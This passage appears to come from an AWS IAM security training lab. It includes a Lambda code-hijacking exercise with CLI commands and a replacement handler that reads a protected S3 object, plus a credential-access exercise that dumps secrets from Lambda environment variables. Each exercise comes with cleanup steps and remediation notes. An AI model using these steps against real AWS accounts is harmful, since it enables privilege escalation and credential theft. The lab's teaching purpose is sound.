**Step 3: View the target function's role**
```bash
aws lambda get-function --function-name iamws-privileged-lambda \
  --query 'Configuration.Role' --output text \
  --profile iamws-lambda-developer-user
```

**Step 4: Save the original code hash for reference**
```bash
ORIGINAL_HASH=$(aws lambda get-function --function-name iamws-privileged-lambda \
  --query 'Configuration.CodeSha256' --output text \
  --profile iamws-lambda-developer-user)
echo "Original code hash: $ORIGINAL_HASH"
```

**Step 5: Create a malicious Lambda payload**

Create a Python handler that proves admin access by reading the crown jewels from S3:

```bash
mkdir -p /tmp/iamws-exploit

cat > /tmp/iamws-exploit/lambda_function.py << 'PYEOF'
import boto3
import json

def handler(event, context):
    sts = boto3.client('sts')
    s3 = boto3.client('s3')

    identity = sts.get_caller_identity()

    # Grab the crown jewels from S3
    bucket = f"iamws-crown-jewels-{identity['Account']}"
    obj = s3.get_object(Bucket=bucket, Key='flag.txt')
    crown_jewels = obj['Body'].read().decode('utf-8')

    return {
        'statusCode': 200,
        'identity': {
            'Account': identity['Account'],
            'Arn': identity['Arn'],
            'UserId': identity['UserId']
        },
        'crown_jewels': crown_jewels
    }
PYEOF

cd /tmp/iamws-exploit && zip -j exploit.zip lambda_function.py
cd -
```

**Step 6: Update the function code**
```bash
aws lambda update-function-code \
  --function-name iamws-privileged-lambda \
  --zip-file fileb:///tmp/iamws-exploit/exploit.zip \
  --profile iamws-lambda-developer-user
```

**Step 7: Invoke the function and claim the crown jewels**
```bash
aws lambda invoke \
  --function-name iamws-privileged-lambda \
  --payload '{}' \
  /tmp/iamws-exploit/response.json \
  --profile iamws-lambda-developer-user

cat /tmp/iamws-exploit/response.json | jq .
```

**Expected output:**
```json
{
  "statusCode": 200,
  "identity": {
    "Account": "123456789012",
    "Arn": "arn:aws:sts::123456789012:assumed-role/iamws-privileged-lambda-role/iamws-privileged-lambda",
    "UserId": "AROA..."
  },
  "crown_jewels": "  ============================================\n     YOU FOUND THE CROWN JEWELS! ..."
}
```

**You just hijacked a privileged Lambda function** by replacing its code to read the crown jewels from S3. The Lambda's identity is `iamws-privileged-lambda-role` with `AdministratorAccess`.

### Cleanup

Restore the original Lambda code and clean up temp files:

```bash
# Recreate the original harmless handler
cat > /tmp/iamws-exploit/lambda_function.py << 'PYEOF'
import json

def handler(event, context):
    return {
        'statusCode': 200,
        'body': json.dumps('Hello from privileged Lambda!')
    }
PYEOF

cd /tmp/iamws-exploit && zip -j original.zip lambda_function.py
cd -

# Restore the original code
aws lambda update-function-code \
  --function-name iamws-privileged-lambda \
  --zip-file fileb:///tmp/iamws-exploit/original.zip \
  --profile iamws-lambda-developer-user

# Clean up temp files
rm -rf /tmp/iamws-exploit
```

### What You Learned

- **lambda:UpdateFunctionCode** with `Resource: "*"` allows hijacking any Lambda
- The root cause is the lack of **resource constraint** (should restrict to specific Lambda ARNs)
- Existing PassRole attacks target compute that ALREADY has privileged roles
- **Remediation preview:** In Lab 2, you'll add a **resource constraint** to limit which Lambdas can be modified

---

## Exercise 7: GetFunctionConfiguration - Credential Access

**Category:** Credential Access
**Starting IAM Principal:** `iamws-secrets-reader-user`
**Target:** Secrets in `iamws-app-with-secrets` Lambda environment variables

**The Vulnerability:** The `iamws-secrets-reader-user` can read Lambda function configurations, which include environment variables. A Lambda function has secrets (database password, API keys) stored in plaintext environment variables—visible to anyone who can call `GetFunctionConfiguration`.

**Real-world scenario:** A monitoring or debugging tool needs read access to Lambda configurations. Environment variables are a common (but insecure) place to store secrets. Anyone with this read permission can see all secrets.

### Visualize in awspx

Open **Advanced Search** in awspx. Set **From** to `iamws-secrets-reader-user` and **To** to `Effective Admin`, then click **Run** (▶). You may notice that **no attack edge appears** for this user. That's because this vulnerability is *credential access* — reading hardcoded secrets from environment variables — not an IAM privilege escalation. awspx focuses on IAM-based attack paths (policy modification, role assumption, PassRole chains), so credential theft from plaintext env vars falls outside its detection model. This is an important reminder that no single tool catches everything.

### Part A: Identify with pmapper

```bash
pmapper query "can user/iamws-secrets-reader-user do lambda:GetFunctionConfiguration with *"
```

Expected output:
```
user/iamws-secrets-reader-user IS authorized to call action
lambda:GetFunctionConfiguration for resource *
```

### Part B: Understand the Attack Category

- **Category:** Credential Access
- **Required Permission:** `lambda:GetFunctionConfiguration`
- **Root Cause:** Secrets stored in plaintext Lambda environment variables
- **Impact:** Access to credentials for external systems (databases, APIs, etc.)

This category is different—you're not escalating IAM permissions, you're accessing credentials that grant access outside AWS.

### Part C: Exploit the Vulnerability

**Step 1: Find Lambdas with environment variables**
```bash
aws lambda list-functions \
  --query 'Functions[?Environment.Variables].FunctionName' \
  --output table \
  --profile iamws-secrets-reader-user
```

**Step 2: Read the secrets**
```bash
aws lambda get-function-configuration \
  --function-name iamws-app-with-secrets \
  --query 'Environment.Variables' \
  --output json \
  --profile iamws-secrets-reader-user
```

**Expected output (SECRETS EXPOSED!):**
```json
{
    "DB_HOST": "prod-db.example.internal",
    "DB_USERNAME": "app_service_account",
    "DB_PASSWORD": "SuperSecretPassword123!",
    "API_KEY": "sk-prod-api-key-do-not-expose",
    "ADMIN_CREDENTIALS": "admin:P@ssw0rd!"
}
```

**You just read production database credentials, API keys, and admin passwords.**

> [!NOTE]
> **Why no crown jewels S3 check here?** Unlike the other exercises, this is **credential access** — not IAM privilege escalation. The attacker's AWS permissions were never escalated, so the crown jewels S3 bucket stays safely out of reach. But don't underestimate this attack: in production, the exposed secrets (database passwords, API keys, admin credentials) often grant access to data that's just as sensitive as anything in S3 — customer PII in databases, admin consoles for SaaS tools, or credentials for external systems.

### What You Learned

- Lambda environment variables are **visible to anyone** with `GetFunctionConfiguration`
- This is NOT an IAM privilege escalation—it's credential theft
- Secrets in env vars is a **best practice violation**, not a policy misconfiguration
- **Remediation preview:** In Lab 2, you'll learn to use **AWS Secrets Manager** instead

---

## Wrap-up

### What You Accomplished

In this lab, you:
1. Built an IAM graph using pmapper and identified privilege escalation paths
1. Explored IAM relationships visually with awspx
1. Exploited **six distinct privilege escalation vulnerabilities**, each with a **different root cause**:

| Exercise | Attack | Category | Root Cause |
|----------|--------|----------|------------|
| 2 | PutGroupPolicy | Self-Escalation | Can write inline policies on own group (no resource constraint) |
| 3 | CreatePolicyVersion | Self-Escalation | Can modify policy attached to self |
| 4 | AssumeRole | Principal Access | Trust policy trusts account root |
| 5 | PassRole + EC2 | New PassRole | Missing iam:PassedToService condition |
| 6 | UpdateFunctionCode | Existing PassRole | Can modify any Lambda (no resource constraint) |
| 7 | GetFunctionConfiguration | Credential Access | Secrets in plaintext env vars 

---

## Optional: Additional pmapper Queries

Explore more of pmapper's query capabilities:

```bash
# Who can become admin?
pmapper query "who can do iam:* with *"

# Can a specific user reach admin?
pmapper query "can user/iamws-ci-runner-user do s3:* with *"

# Who can pass a specific role?
pmapper query "who can do iam:PassRole with arn:aws:iam::*:role/iamws-prod-deploy-role"

# List all privesc paths
pmapper analysis --output-type text

# Visualize the graph (requires graphviz)
pmapper visualize
```
